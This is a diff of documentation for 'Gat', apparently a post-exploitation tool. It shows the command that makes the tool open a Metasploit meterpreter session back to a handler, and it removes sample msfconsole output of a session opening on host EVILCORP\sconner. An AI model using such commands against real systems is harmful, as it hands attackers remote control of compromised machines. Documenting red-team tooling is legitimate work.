@@ -82,29 +82,8 @@ Then, in `Gat`, use the `meterpreter` command:
 ```bash
 [Gat]> meterpreter https 127.0.0.1:8443
 ```
-
 A new meterpreter session should pop in `msfconsole`:
 
-```bash
-[13:37:00][127.0.0.1][Sessions: 0][Jobs: 1] exploit(multi/handler) >
-[*] [2022.02.22-13:37:00] https://127.0.0.1:8443 handling request from 127.0.0.1; (UUID: uxec7w3h) Staging x64 payload (206937 bytes) ...
-[*] meterpreter session 1 opened (127.0.0.1:8443 -> 127.0.0.1:44804) at 2022-02-22 13:37:00 +0100
-
-[13:37:03][127.0.0.1][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions
-
-Active sessions
-===============
-
-  Id  Name  Type                     Information                            Connection
-  --  ----  ----                     -----------                            ----------
-  1         meterpreter x64/windows  EVILCORP\sconner @ LWS01  127.0.0.1:8443 -> 127.0.0.1:44804 (127.0.0.1)
-
-[13:37:05][127.0.0.1][Sessions: 1][Jobs: 1] exploit(multi/handler) > sessions -i 1
-[*] Starting interaction with 1...
-
-meterpreter > getuid
-Server username: LWS01\sconner
-```
 Here is an example with `ncat`:
 
 ```
